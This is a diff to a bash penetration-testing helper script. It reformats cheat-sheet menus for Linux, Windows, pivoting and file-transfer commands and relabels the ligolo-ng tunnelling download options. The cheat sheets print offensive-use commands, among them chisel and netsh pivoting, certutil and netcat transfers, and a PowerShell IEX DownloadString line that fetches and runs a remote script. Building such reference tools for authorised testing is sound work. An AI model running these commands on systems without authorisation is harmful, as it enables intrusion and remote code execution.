@@ -728,14 +728,17 @@ show_cheatsheets() {
         echo -e "1) Linux commands"
         echo -e "2) Windows commands"
         echo -e "3) Pivoting"
-        echo -e "4) File transfer"
+        echo -e "4) File transfers"
         echo -e "5) Back to Main Menu"
         read -e -p "Option: " cheatsheet_option
 
         case $cheatsheet_option in
             1)
-		            clear
-                echo -e "${GREEN}Linux commands:${NC}"
+		        clear
+                echo -e "${VIOLET}\n\n\n===================================================="
+                echo -e "================== ${YELLOW}Linux Commands ${VIOLET}=================="
+                echo -e "====================================================${NC}"
+                echo
                 echo -e "${YELLOW}ls: List files and directories${NC}"
                 echo "example: ls -la"
                 echo
@@ -811,10 +814,15 @@ show_cheatsheets() {
                 echo -e "${YELLOW}htop: Improved version of top${NC}"
                 echo "example: htop"
                 echo
+                read -e -p "Press enter to go back..."
+                break
                 ;;
             2)
-		            clear
-                echo -e "${GREEN}Windows commands:${NC}"
+		        clear
+                echo -e "${VIOLET}\n\n\n======================================================"
+                echo -e "================== ${YELLOW}Windows Commands ${VIOLET}=================="
+                echo -e "======================================================${NC}"
+                echo
                 echo -e "${YELLOW}dir: List files and directories${NC}"
                 echo "example: dir"
                 echo
@@ -881,10 +889,15 @@ show_cheatsheets() {
                 echo -e "${YELLOW}wmic: Windows Management Instrumentation interface${NC}"
                 echo "example: wmic process list"
                 echo
+                read -e -p "Press enter to go back..."
+                break
                 ;;
             3)
-		            clear
-                echo -e "${GREEN}Pivoting:${NC}"
+		        clear
+                echo -e "${VIOLET}\n\n\n=============================================="
+                echo -e "================== ${YELLOW}Pivoting ${VIOLET}=================="
+                echo -e "==============================================${NC}"
+                echo
                 echo -e "${YELLOW}Chisel Server:${NC}"
                 echo "We have to have chisel decompressed: gunzip chisel_1.X.X_linux_arm64.gz"
                 echo "Give execution permissions: chmod +x chisel"
@@ -902,56 +915,73 @@ show_cheatsheets() {
                 echo -e "${YELLOW}Netsh:${NC}"
                 echo -e "${BLUE}example: netsh interface portproxy add v4tov4 listenport=${VIOLET}LOCAL-PORT${BLUE} listenaddress=${VIOLET}LOCAL-IP${BLUE} connectport=${VIOLET}REMOTE-PORT${BLUE} connectaddress=${VIOLET}TARGET-IP${NC}"
                 echo
+                read -e -p "Type [1] to go the Downloads Page  |  Press [ENTER] to go back: " enterx
+                if [ "$enterx" = "1" ]; then
+                    clear
+                    download_tools
+                else
+                    clear
+                    break
+                fi
                 ;;
             4)
-		            clear
-                echo -e "${GREEN}File transfer:${NC}"
-						    echo -e "${YELLOW}Linux:${NC}"
-    				    echo -e "${YELLOW}curl:${NC}"
-    				    echo "example: curl -O http://example.com/file"
-    				    echo
-    				    echo -e "${YELLOW}wget:${NC}"
-    				    echo "example: wget http://example.com/file"
-    				    echo
-    				    echo -e "${YELLOW}socat:${NC}"
-    				    echo "example: socat TCP-LISTEN:1234,fork file:file_to_send"
-    				    echo
-    				    echo -e "${YELLOW}netcat:${NC}"
-    				    echo "example: nc -l -p 1234 > file_received"
-    				    echo
-    				    echo -e "${YELLOW}scp:${NC}"
-    				    echo "example: scp file_to_send user@remote_host:/path/to/destination"
-    				    echo
-    				    echo -e "${YELLOW}rsync:${NC}"
-    				    echo "example: rsync -avz file_to_send user@remote_host:/path/to/destination"
-    				    echo
-    				    echo -e "${YELLOW}Windows:${NC}"
-    				    echo -e "${YELLOW}PowerShell (Download a file):${NC}"
-    				    echo "example: powershell -c \"(new-object System.Net.WebClient).DownloadFile('http://example.com/file','C:\\path\\to\\save\\file')\""
-    				    echo
-    				    echo -e "${YELLOW}certutil:${NC}"
-    				    echo "example: certutil.exe -urlcache -f http://example.com/file C:\\path\\to\\save\\file"
-    				    echo
-    				    echo -e "${YELLOW}socat:${NC}"
-    				    echo "example: socat TCP4:remote_host:1234 file:file_received,create"
-    				    echo
-    				    echo -e "${YELLOW}netcat:${NC}"
-    				    echo "example: nc.exe -nlvp 4444 > incoming.exe"
-    				    echo
-    				    echo -e "${YELLOW}PowerShell (Remote script execution):${NC}"
-    				    echo "example: powershell.exe IEX (New-Object System.Net.WebClient).DownloadString('http://example.com/script.ps1')"
-    				    echo
-    				    echo -e "${YELLOW}FTP:${NC}"
-    				    echo "example: ftp -s:script.txt"
-    				    echo "Nota: 'script.txt' contiene comandos FTP como 'open', 'user', 'get', etc."
-    				    echo
-    				    echo -e "${YELLOW}Powercat:${NC}"
-   				      echo "example: powercat -c remote_host -p 443 -i C:\\path\\to\\file"
-    				    echo
-    				    echo -e "${YELLOW}Download wget with PowerShell:${NC}"
-    				    echo "example: powershell -command \"Invoke-WebRequest -Uri 'https://eternallybored.org/misc/wget/current/wget.exe' -OutFile 'C:\\path\\to\\save\\wget.exe'\""
-    				    echo
-    				    ;;
+		        clear
+                echo -e "${VIOLET}\n\n\n===================================================="
+                echo -e "================== ${YELLOW}File Transfers ${VIOLET}=================="
+                echo -e "====================================================${NC}"
+                echo
+				echo -e "${GREEN}LINUX:${NC}"
+                echo
+    			echo -e "${YELLOW}curl:${NC}"
+    			echo "example: curl -O http://example.com/file"
+    			echo
+    			echo -e "${YELLOW}wget:${NC}"
+    			echo "example: wget http://example.com/file"
+    			echo
+    			echo -e "${YELLOW}socat:${NC}"
+    			echo "example: socat TCP-LISTEN:1234,fork file:file_to_send"
+    			echo
+    			echo -e "${YELLOW}netcat:${NC}"
+    			echo "example: nc -l -p 1234 > file_received"
+    			echo
+    			echo -e "${YELLOW}scp:${NC}"
+    			echo "example: scp file_to_send user@remote_host:/path/to/destination"
+    			echo
+    			echo -e "${YELLOW}rsync:${NC}"
+    			echo "example: rsync -avz file_to_send user@remote_host:/path/to/destination"
+    			echo
+                echo -e "${VIOLET} ----------------------------------------------------------------------"
+                echo
+    			echo -e "${GREEN}WINDOWS:${NC}"
+                echo
+    			echo -e "${YELLOW}PowerShell (Download a file):${NC}"
+    			echo "example: powershell -c \"(new-object System.Net.WebClient).DownloadFile('http://example.com/file','C:\\path\\to\\save\\file')\""
+    			echo
+    			echo -e "${YELLOW}certutil:${NC}"
+    			echo "example: certutil.exe -urlcache -f http://example.com/file C:\\path\\to\\save\\file"
+    			echo
+    			echo -e "${YELLOW}socat:${NC}"
+    			echo "example: socat TCP4:remote_host:1234 file:file_received,create"
+    			echo
+    			echo -e "${YELLOW}netcat:${NC}"
+    			echo "example: nc.exe -nlvp 4444 > incoming.exe"
+    			echo
+    			echo -e "${YELLOW}PowerShell (Remote script execution):${NC}"
+    			echo "example: powershell.exe IEX (New-Object System.Net.WebClient).DownloadString('http://example.com/script.ps1')"
+    			echo
+    			echo -e "${YELLOW}FTP:${NC}"
+    			echo "example: ftp -s:script.txt"
+    			echo "Nota: 'script.txt' contiene comandos FTP como 'open', 'user', 'get', etc."
+    			echo
+    			echo -e "${YELLOW}Powercat:${NC}"
+   				echo "example: powercat -c remote_host -p 443 -i C:\\path\\to\\file"
+    			echo
+    			echo -e "${YELLOW}Download wget with PowerShell:${NC}"
+    			echo "example: powershell -command \"Invoke-WebRequest -Uri 'https://eternallybored.org/misc/wget/current/wget.exe' -OutFile 'C:\\path\\to\\save\\wget.exe'\""
+    			echo
+                read -e -p "Press enter to go back..."
+                break
+    			;;
             5)
                 clear
                 break
@@ -1496,20 +1526,20 @@ download_tools() {
             ;;
         3)
             echo -e "${BLUE}Select Ligolo version to download:${NC}"
-            echo -e "1) Client"
-            echo -e "2) Server"
+            echo -e "1) Ng-Proxy (Server)"
+            echo -e "2) Ng-Agent (Client)"
             echo -e "3) Back to Main Menu"
-            read -p "Enter your choice: " ligolo_choice
+            read -e -p "Enter your choice: " ligolo_choice
             case $ligolo_choice in
                 1)
-                    echo -e "${BLUE}Select Ligolo Client version to download:${NC}"
+                    echo -e "${BLUE}Select Ligolo Ng-Proxy version to download:${NC}"
                     echo -e "1) Ligolo Proxy V0.6.1 Linux"
                     echo -e "2) Ligolo Proxy V0.5.2 Linux"
                     echo -e "3) Ligolo Proxy V0.6.1 Windows"
                     echo -e "4) Ligolo Proxy V0.5.2 Windows"
                     echo -e "5) Back to Main Menu"
-                    read -p "Enter your choice: " ligolo_client_version
-                    case $ligolo_client_version in
+                    read -e -p "Enter your choice: " ligolo_server_version
+                    case $ligolo_server_version in
                         1) 
                             wget -P "$BASE_DIR/tools" "https://github.com/nicocha30/ligolo-ng/releases/download/v0.6.1/ligolo-ng_proxy_0.6.1_linux_amd64.tar.gz"
                             clear
@@ -1546,8 +1576,8 @@ download_tools() {
                     echo -e "3) Ligolo Agent V0.6.1 Windows"
                     echo -e "4) Ligolo Agent V0.5.2 Windows"
                     echo -e "5) Back to Main Menu"
-                    read -p "Enter your choice: " ligolo_server_version
-                    case $ligolo_server_version in
+                    read -e -p "Enter your choice: " ligolo_client_version
+                    case $ligolo_client_version in
                         1) 
                             wget -P "$BASE_DIR/tools" "https://github.com/nicocha30/ligolo-ng/releases/download/v0.6.1/ligolo-ng_agent_0.6.1_linux_amd64.tar.gz"
                             clear
@@ -1596,7 +1626,7 @@ download_tools() {
             ;;
         6)
             clear
-            return
+            main_menu
             ;;
         *)
             echo -e "${RED}[-] Invalid option.${NC}"
